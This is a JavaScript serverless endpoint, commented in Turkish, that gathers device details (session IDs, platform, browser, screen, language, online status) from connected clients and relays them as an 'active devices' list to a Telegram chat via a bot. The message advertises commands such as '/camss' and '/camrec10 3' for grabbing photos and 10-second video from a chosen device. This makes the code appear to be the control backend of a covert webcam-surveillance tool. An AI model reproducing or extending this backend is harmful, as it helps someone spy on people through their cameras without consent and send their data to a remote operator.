// 📱 Collect and List All Devices API
// Tüm cihazlardan bilgi toplar ve tek mesajda gönderir

const TELEGRAM_API_URL = 'https://api.telegram.org/bot';

// Geçici cihaz bilgileri depolama (2 saniye)
const deviceCollections = new Map();

export default async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'Method not allowed' });
    }

    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!botToken || !chatId) {
            return res.status(500).json({ success: false, error: 'Server configuration error' });
        }

        const { action, device_info, collection_id } = req.body;

        if (!collection_id) {
            return res.status(400).json({ success: false, error: 'collection_id required' });
        }

        // Cihaz bilgisi ekle
        if (action === 'add') {
            if (!deviceCollections.has(collection_id)) {
                const collection = {
                    devices: [],
                    created_at: Date.now(),
                    timer: null,
                    sent: false
                };
                
                deviceCollections.set(collection_id, collection);
                
                // 2.5 saniye sonra otomatik gönder
                collection.timer = setTimeout(async () => {
                    if (!collection.sent) {
                        collection.sent = true;
                        await sendDeviceList(botToken, chatId, collection_id, deviceCollections);
                    }
                }, 2500);
            }

            const collection = deviceCollections.get(collection_id);
            
            // Bu collection zaten gönderildiyse yeni ekleneni kabul etme
            if (collection.sent) {
                return res.status(200).json({
                    success: false,
                    message: 'Collection already sent',
                    device_count: collection.devices.length
                });
            }
            
            collection.devices.push(device_info);

            return res.status(200).json({
                success: true,
                message: 'Device added to collection',
                device_count: collection.devices.length,
                will_send_in: 2.5
            });
        }

        // Manuel send action (artık gerek yok ama uyumluluk için bırakıldı)
        if (action === 'send') {
            return res.status(200).json({
                success: true,
                message: 'Auto-send is enabled, no need for manual send'
            });
        }

        return res.status(400).json({ success: false, error: 'Invalid action' });

    } catch (error) {
        console.error('Error in collect-devices:', error);
        return res.status(500).json({
            success: false,
            error: 'Internal server error',
            message: error.message
        });
    }
}

// Cihaz listesini oluştur ve gönder
async function sendDeviceList(botToken, chatId, collectionId, deviceCollections) {
    const collection = deviceCollections.get(collectionId);

    if (!collection || collection.devices.length === 0) {
        const message = '📱 <b>AKTİF CİHAZ YOK</b>\n\nŞu anda bağlı cihaz bulunmuyor.';
        await sendTelegramMessage(botToken, chatId, message);
        deviceCollections.delete(collectionId);
        return;
    }

    // Mesaj oluştur
    let message = '📱 <b>AKTİF CİHAZLAR</b>\n';
    message += `━━━━━━━━━━━━━━━━\n`;
    message += `Toplam: <b>${collection.devices.length}</b> cihaz\n\n`;

    collection.devices.forEach((device, index) => {
        const deviceNum = index + 1;
        const platform = device.platform || 'Unknown';
        const browser = getBrowser(device.user_agent || '');
        const emoji = getDeviceEmoji(platform);
        const sessionId = device.session_id || 'unknown';
        
        message += `<b>${deviceNum}.</b> ${emoji} <code>${sessionId}</code>\n`;
        message += `   📱 ${platform} - ${browser}\n`;
        
        if (device.screen) {
            message += `   📺 ${device.screen}\n`;
        }
        
        if (device.language) {
            message += `   🌐 ${device.language}\n`;
        }
        
        message += `   ${device.online === 'Online' ? '🟢 Online' : '🔴 Offline'}\n\n`;
    });

    message += `━━━━━━━━━━━━━━━━\n`;
    message += `💡 <b>Kullanım:</b>\n`;
    message += `• <code>/camss</code> - Tüm cihazlar\n`;
    message += `• <code>/camss 2</code> - Sadece 2. cihaz\n`;
    message += `• <code>/camrec10 3</code> - 3. cihazdan 10s video\n`;
    message += `• <code>/help</code> - Komutları göster`;

    // Telegram'a gönder
    await sendTelegramMessage(botToken, chatId, message);

    // Collection'ı temizle
    deviceCollections.delete(collectionId);
}

// Telegram mesajı gönder
async function sendTelegramMessage(botToken, chatId, text) {
    const url = `${TELEGRAM_API_URL}${botToken}/sendMessage`;
    const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        })
    });
    return await response.json();
}

// Browser bilgisi
function getBrowser(userAgent) {
    if (!userAgent) return 'Unknown';
    if (userAgent.includes('Chrome')) return 'Chrome';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Safari')) return 'Safari';
    if (userAgent.includes('Edge')) return 'Edge';
    return 'Other';
}

// Platform emoji
function getDeviceEmoji(platform) {
    if (!platform) return '📱';
    const p = platform.toLowerCase();
    if (p.includes('win')) return '🖥️';
    if (p.includes('mac')) return '💻';
    if (p.includes('linux')) return '🐧';
    if (p.includes('android')) return '📱';
    if (p.includes('iphone') || p.includes('ipad')) return '📱';
    return '📱';
}

// Eski collection'ları temizle (memory cleanup)
setInterval(() => {
    const now = Date.now();
    for (const [id, collection] of deviceCollections.entries()) {
        if (now - collection.created_at > 5000) { // 5 saniyeden eski
            deviceCollections.delete(id);
        }
    }
}, 10000); // Her 10 saniyede bir temizle

